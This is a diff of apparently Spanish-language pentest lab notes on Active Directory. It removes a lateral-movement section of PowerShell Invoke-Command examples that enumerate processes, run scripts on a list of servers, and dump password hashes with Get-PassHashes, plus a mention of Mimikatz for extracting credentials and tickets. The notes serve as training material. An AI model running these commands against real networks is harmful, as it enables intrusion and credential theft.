@@ -281,20 +281,4 @@ winrs -r:dcorp-ci cmd
 ```
 
 ## Movimiento Lateral
-Utilizaremos *Invoke-Command* para enumerar los procesos de los equipos a los que tenemos acceso
-```shell
-Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content .\servers.txt)
-```
 
-También podemos ejecutar scripts remotamente en los equipos que tenemos acceso
-```shell
-Invoke-Command -FilePath <ruta_scripts> -ComputerName (Get-Content .\servers.txt) 
-```
-
-Ejecutar un comando que esta alojado en la maquina remota
-```shell
-Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
-```
-
-#### Mimikatz
-Se puede usar para extraer credenciales, tickets, credenciales replay, etc....
